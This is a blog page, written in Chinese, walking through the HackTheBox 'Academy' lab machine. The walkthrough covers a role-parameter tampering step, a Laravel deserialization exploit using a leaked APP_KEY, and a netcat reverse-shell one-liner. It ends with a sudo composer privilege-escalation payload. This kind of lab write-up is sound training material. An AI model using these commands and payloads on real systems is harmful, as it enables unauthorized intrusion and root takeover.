@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fre4k5en.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="信息收集利用nmap进行端口服务扫描 1nmap -sV -sC 10.10.10.215">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Academy">
+<meta property="og:url" content="https://fre4k5en.com/2021/11/04/HackTheBox-Academy/index.html">
+<meta property="og:site_name" content="最后的家">
+<meta property="og:description" content="信息收集利用nmap进行端口服务扫描 1nmap -sV -sC 10.10.10.215">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20x64wfj311n0u07ez.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20tn6muj31450u01dy.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20prlkrj30wj0u07gp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20klwfaj31620qs4dy.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20e93vcj31c00u0b1w.jpg">
+<meta property="og:image" content="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20201228122553130.png">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3knlyb7yj30u00xz79m.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3ku0n30vj312s0a4whc.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3kxp4xwvj30v20ai75p.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o36dmicj30uk0mm0xe.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o4kopezj30vc06cq3p.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o6zoxnvj30gs03ewen.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o5tx10mj30w40gqmzv.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oiz07oij30t406mmyk.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3onjj4w2j31gi0e6di0.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3opy0xntj30u00v2n4d.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oy21t15j30re060dgh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pbtym3oj313q0csgoh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pfhp19hj314k0suacd.jpg">
+<meta property="article:published_time" content="2021-11-04T08:23:11.000Z">
+<meta property="article:modified_time" content="2021-11-04T09:38:22.189Z">
+<meta property="article:author" content="Fre4k5en">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg">
+
+
+<link rel="canonical" href="https://fre4k5en.com/2021/11/04/HackTheBox-Academy/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fre4k5en.com/2021/11/04/HackTheBox-Academy/","path":"2021/11/04/HackTheBox-Academy/","title":"HackTheBox-Academy"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox-Academy | 最后的家</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">最后的家</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fre4k5en's Shelter</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E6%9D%83%E9%99%90"><span class="nav-text">web权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-flag"><span class="nav-text">User flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Root-flag"><span class="nav-text">Root flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Sudo"><span class="nav-text">Sudo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8"><span class="nav-text">引用</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fre4k5en"
+      src="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+  <p class="site-author-name" itemprop="name">Fre4k5en</p>
+  <div class="site-description" itemprop="description">我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fre4k5en" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fre4k5en" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fre4k5en@gmail.com" title="E-Mail → mailto:fre4k5en@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fre4k5en.com/2021/11/04/HackTheBox-Academy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/Fre4k5en/BlogAssets/logo.jpeg">
+      <meta itemprop="name" content="Fre4k5en">
+      <meta itemprop="description" content="我的朋友好像都是网上的那些人，现实中不爱理人也没有人理我。有一天妈妈突然问我，万一有一天网络消失了，你该怎么办？那一刻我如醍醐灌顶，想通了很多事情。原来我人生中最重要的使命，就是保护互联网，不让它消失。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="最后的家">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox-Academy
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-11-04 16:23:11 / Modified: 17:38:22" itemprop="dateCreated datePublished" datetime="2021-11-04T16:23:11+08:00">2021-11-04</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用nmap进行端口服务扫描</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -sC <span class="number">10.10.10.215</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg" alt="image-20201203225102507"></a></p>
+<span id="more"></span>
+
+<h3 id="web权限"><a href="#web权限" class="headerlink" title="web权限"></a>web权限</h3><p>发现22、80端口，在本地hosts文件中加入解析记录</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#academy.htb</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.10.215</span>	academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口后发现，有登录和注册功能，admin.php可能是管理员登录入口，普通注册登录后发现没什么有价值的地方，但在抓取注册包时发现：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=root<span class="variable">&amp;password</span>=root<span class="variable">&amp;confirm</span>=root<span class="variable">&amp;roleid</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>roleid=0，盲猜id可能是角色分组字段，尝试id=1注册的话可能是管理员，成功注册登录后，进入一个待办列表，</p>
+<p>第一项为：完整的初始化模块设置，账户密码最后一项状态为：pending待解决</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20x64wfj311n0u07ez.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20x64wfj311n0u07ez.jpg" alt="image-20201203225054548"></a></p>
+<p>发现地址 dev-staging-01.academy.htb，访问后提示没有对应的dns解析，通过登录页面尝试登录无果，在本地hosts文件中加入解析记录</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#academy.htb</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.10.215</span>	academy.htb</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.10.215</span>	dev-staging-<span class="number">01</span>.academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>得到页面</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20tn6muj31450u01dy.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20tn6muj31450u01dy.jpg" alt="image-20201203225047966"></a></p>
+<p>提示文件访问权限错误，并在下方的请求数据中发现数据库账户密码、reddis信息、邮件服务器、文档目录等等</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20prlkrj30wj0u07gp.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20prlkrj30wj0u07gp.jpg" alt="image-20201203225042471"></a></p>
+<p>3306/6379/2525端口均关闭，这里有两个很重要的信息APP_NAME和APP_KEY</p>
+<p>msf中可以找到一个laravel框架反序列化漏洞利用脚本，填写option字段：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">APP_KEY</span> dBLUaMuZz<span class="number">7</span>Iq<span class="number">06</span>XtL/Xnz/<span class="number">90</span>Ejq+DEEynggqubHWFj<span class="number">0</span>=</span><br><span class="line"></span><br><span class="line"><span class="attribute">RHOSTS</span> <span class="number">10.10.10.215</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RPORT</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">TARGETURI</span> /</span><br><span class="line"></span><br><span class="line"><span class="attribute">VHOST</span> dev-staging-<span class="number">01</span>.academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>这里有个坑，虽然VHOST不是必须字段，但是这里必须要填，笔者猜测可能是因为本靶机存在VPN虚拟网络环境中的缘故。</p>
+<p>run后，获得www-data权限，查看/home，发现有很多用户，但只有cry0l1t3和mrb3n是我们熟悉的，mrb3n中没有有用的信息</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20klwfaj31620qs4dy.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20klwfaj31620qs4dy.jpg" alt="image-20201203225033972"></a></p>
+<p>在当前shell下不能cd更改工作目录，重新弹回来一个shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>f;cat <span class="regexp">/tmp/</span>f|<span class="regexp">/bin/</span>sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4444</span> &gt;<span class="regexp">/tmp/</span>f</span><br></pre></td></tr></table></figure>
+
+<p><del>运行linpeas.sh后发现是一个开源基线检查脚本，应该是其他人传上去的，列出了很多可能存在漏洞可以提权的点（如果可能）中查看</del>没用</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20e93vcj31c00u0b1w.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20e93vcj31c00u0b1w.jpg" alt="image-20201203225023628"></a></p>
+<h3 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h3><p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20201228122553130.png" alt="image-20201228122553130">](<a target="_blank" rel="noopener" href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20201228122553130.png)</p>
+<p>各种翻看文件，发现了mysql root账户密码</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3knlyb7yj30u00xz79m.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3knlyb7yj30u00xz79m.jpg" alt="image-20201228145117912"></a></p>
+<p>这里有dbuser账户密码</p>
+<p>这里其实使用root登录数据库查找users表时，可以找到md5加密的mySup3rP4s5w0rd，一样的</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3ku0n30vj312s0a4whc.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3ku0n30vj312s0a4whc.jpg" alt="image-20201228145727443"></a></p>
+<p>爆破得到cry0l1t3账户，flag user.txt</p>
+<h3 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h3><p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3kxp4xwvj30v20ai75p.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3kxp4xwvj30v20ai75p.jpg" alt="image-20201228150100131"></a></p>
+<p>发现当前用户所处的有个adm组</p>
+<blockquote>
+<p>常见的伪用户如下所示：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">伪 用 户 含 义 </span><br><span class="line">bin 拥有可执行的用户命令文件 </span><br><span class="line">sys 拥有系统文件 </span><br><span class="line">adm 拥有帐户文件 </span><br><span class="line">uucp UUCP使用 </span><br><span class="line"><span class="built_in">lp</span> <span class="built_in">lp</span>或lpd子系统使用 </span><br><span class="line">nobody NFS使用</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>默认情况下Ubuntu（以10.04为例）创建的用户是自动添加到以下这些组的，<br>adm dialout cdrom plugdev lpadmin sambashare admin</p>
+<p>dialout（拨号）<br>cdrom（光驱）<br>plugdev（U盘等）<br>lpadmin（打印机）<br>sambashare（smb共享）<br>admin（sudo，这个就<a target="_blank" rel="noopener" href="http://wiki.ubuntu.org.cn/Sudo">不解释</a>了）<br>adm（干嘛的？因为以前的/var/adm就是现在的/var/log，作用是作为非root用户时，该组用户可以查看log）</p>
+<p>在修改属组的时候，需要注意usermod命令参数易混淆。</p>
+<p>显示某用户所属的组</p>
+<blockquote>
+<p>id -nG 某用户</p>
+</blockquote>
+<p>如果某用户只属于组1，现在想让他属于组1组2组3，以下两种方法：</p>
+<ul>
+<li>方法一：添加用户到更多的组</li>
+</ul>
+<blockquote>
+<p>usermod -a -G 组2,组3 某用户</p>
+</blockquote>
+<ul>
+<li>方法二：重新分配用户到哪些组</li>
+</ul>
+<blockquote>
+<p>usermod -G 组1,组2,组3 某用户</p>
+</blockquote>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o36dmicj30uk0mm0xe.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o36dmicj30uk0mm0xe.jpg" alt="image-20201228165001227"></a></p>
+<p>没有找到有价值的信息</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o4kopezj30vc06cq3p.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o4kopezj30vc06cq3p.jpg" alt="image-20201228165123755"></a></p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o6zoxnvj30gs03ewen.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o6zoxnvj30gs03ewen.jpg" alt="image-20201228165343217"></a></p>
+<p>当前不在sudoers中不能使用sudo执行命令</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o5tx10mj30w40gqmzv.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o5tx10mj30w40gqmzv.jpg" alt="image-20201228165235718"></a></p>
+<p><del>egre55账户中有一个.sudo_as_admin_successful的空文件，也许这个账户可以使用sudo执行命令？</del>（误导）</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oiz07oij30t406mmyk.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oiz07oij30t406mmyk.jpg" alt="image-20201228170514441"></a></p>
+<p>执行LinPEAS.sh时发现了su log中记录了mrb3n的密码</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3onjj4w2j31gi0e6di0.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3onjj4w2j31gi0e6di0.jpg" alt="image-20201228170937465"></a></p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3opy0xntj30u00v2n4d.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3opy0xntj30u00v2n4d.jpg" alt="image-20201228171155832"></a></p>
+<p>当前用户有权限执行composer命令，并且发现$home中有composer文件夹</p>
+<blockquote>
+<p>Composer 是 PHP5.3以上 的一个依赖<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/9143974">管理工具</a>。它允许你声明项目所依赖的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E5%BA%93/969653">代码库</a>，它会在你的项目中为你安装他们。Composer 不是一个包管理器。是的，它涉及 “packages” 和 “libraries”，但它在每个项目的基础上进行管理，在你项目的某个目录中（例如 vendor）进行安装。默认情况下它不会在全局安装任何东西。因此，这仅仅是一个依赖管理。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oy21t15j30re060dgh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oy21t15j30re060dgh.jpg" alt="image-20201228171943711"></a></p>
+<p>composer执行文件具有root权限</p>
+<p>Google : “composer privilege escalation”，很容易就能找到一些利用点</p>
+<blockquote>
+<h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><p>If the binary is allowed to run as superuser by <code>sudo</code>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
+<ul>
+<li><pre><code>TF=$(mktemp -d)
+echo &#39;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#39; &gt;$TF/composer.json
+sudo composer --working-dir=$TF run-script x
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pbtym3oj313q0csgoh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pbtym3oj313q0csgoh.jpg" alt="image-20201228173258036"></a></p>
+<p>成功拿到root权限</p>
+<p><a target="_blank" rel="noopener" href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pfhp19hj314k0suacd.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pfhp19hj314k0suacd.jpg" alt="image-20201228173628888"></a></p>
+<p>最后推广了一波HTB的新平台<a target="_blank" rel="noopener" href="https://academy.hackthebox.eu/">https://academy.hackthebox.eu</a></p>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-user-manage.html">https://www.runoob.com/linux/linux-user-manage.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://skyyan.wordpress.com/2011/06/29/adm-vs-admin/">https://skyyan.wordpress.com/2011/06/29/adm-vs-admin/</a></p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/composer/3351208?fr=aladdin">https://baike.baidu.com/item/composer/3351208?fr=aladdin</a></p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/composer/">https://gtfobins.github.io/gtfobins/composer/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/11/04/HackTheBox-Postman/" rel="prev" title="HackTheBox-Postman">
+                  <i class="fa fa-chevron-left"></i> HackTheBox-Postman
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fre4k5en</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
